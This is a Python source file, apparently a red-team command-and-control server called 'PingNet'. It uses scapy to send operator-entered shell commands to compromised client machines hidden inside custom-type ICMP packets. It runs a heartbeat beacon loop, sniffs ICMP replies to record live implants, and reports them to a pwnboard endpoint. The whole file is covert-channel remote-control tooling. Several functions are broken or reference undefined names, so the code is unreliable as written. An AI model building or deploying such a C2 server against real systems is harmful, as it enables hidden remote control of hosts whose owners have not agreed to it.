from scapy.all import *
import csv
import sys
import threading
import random
import requests
import json
import time
from db import Connector

def threaded(fn):
    def wrapper(*args, **kwargs):
        thread = threading.Thread(target=fn, args=args, kwargs=kwargs)
        thread.start()
        return thread
    return wrapper

class Server:
    def __init__(self):
        self.verbose = False
        self.alive = []
        #self.db = Connector()
        with open("test.txt") as file:
            csv_reader = csv.reader(file, delimiter=',')
            for row in csv_reader:
                print(row)

    def shell(self):
        global verbose
        print("Welcome to PingNet")
        while True:
            cmd = input("Pingnet:")
            if cmd == "exit":
                print("Closing")
                break
            elif cmd == "help":
                print("\nPingnet Help\ncallbacks(NI) - view all systems that have beat back\nexit - exits ping net\nhelp - Displays this help menu\nlookup <team number(NI) or specific device> - Lookup infomration on a specific device\nlist(NI) - list all of the stored systems\nsend - Enters the send prompts to send either files(not implemented) or commands to the client device\n")
            elif cmd == "lookup":
                lookup = input("What information to pull:")
                try:
                    print(iplook(lookup))#Fix this to use the database instead
                except IndexError:
                    print("Out of bounds")
                except ValueError:
                    print("Why a negative number")
            elif cmd == "send":
                self.send_cmd()
            elif cmd == "file":
                id = input("Target: ")
                file_transfer(input("What File would you like to send:"), iplook(id))#Fix this to use the database
            elif cmd == "test":
                print("THis is only for testing fuctionality of class not actual control")
                self.sender("11", "whoami", "44", "3")
            else:
                print("Invalid command")

    def sender(self, dest, cmd, protype, protcode):
        print("DEST")
        send(IP(dst=dest)/ICMP(type=protype, code=protcode)/cmd)#Fix this to use the database instead


    def send_cmd(self):
        #typ = random.randint(44,94)
        typ = 44
        target = input("Target:")
        code = input("Cmd Processor")
        cmd =  input("Command:")
        self.sender(target, cmd, typ, code)

    def heartbeats(self):
        ips = ["192.168.232.129"]#self.db.heart_ips_test()
        for ip in ips:
            #print(ip)
            typ = 146
            code = 0
            checked = self.sender(ip, "abcdefghijklmnopqrstuvwxyz",typ,code)
            #Do if logic later
        #time.sleep(5000)
        #self.alive = []
        #self.sendUpdate(alive, name="PingNet")
    @threaded
    def heartbeat(self):
        ip = "192.168.232.129"
        while True:
            typ = 146
            code = 0
            self.sender(ip, "abcdefghijklmnopqrstuvwxyz",typ,code)
            time.sleep(2)
    
    def file_transfer(self, fname):
        with open(fname, "rb") as fsend:
            data = f.read()
            print(data)
    
    def encryptor(self):
        pass #This is necessary


    def resp_mgmt(self, pkt):
        print("recievied")
        if str(pkt.getlayer(ICMP).type) == "146":
            if str(pkt.getlayer(ICMP).code) == "1":
                print("Heartbeat Recieved")
                self.alive.append(pkt.getlayer(IP).src)
                #print(self.alive)
        print(pkt.show())
        print(pkt.getlayer(ICMP).type)
        data = pkt.getlayer(ICMP).load.decode()
        print(data)

    @threaded
    def sniffer(self):
        print("Sniffing")
        sniff(filter="icmp", prn=self.resp_mgmt())
    # These packets will come in periodically. The heartbeat will just have 1pkt that will have the str hb
    
    def sendUpdate(self, ips, name="PingNet"):
        host = "http://pwnboard.win/generic"
        # Here ips is a list of IP addresses to update
        # If we are only updating 1 IP, use "ip" and pass a string
        data = {'ips': ips, 'type': name}
        try:
            req = requests.post(host, json=data, timeout=3)
            print(req.text)
            return True
        except Exception as E:
            print(E)
            return False

class Sniffer(Thread):
    def  __init__(self, interface="eth0"):
        super().__init__()

        self.interface = interface

    def run(self):
        sniff(iface=self.interface, filter="icmp", prn=self.print_packet)

    def print_packet(self, packet):
        ip_layer = packet.getlayer(IP)
        print("[!] New Packet: {src} -> {dst}".format(src=ip_layer.src, dst=ip_layer.dst))

server = Server()
h1 = server.sniffer()
h2 = server.heartbeat()
h1.join()
h2.join()
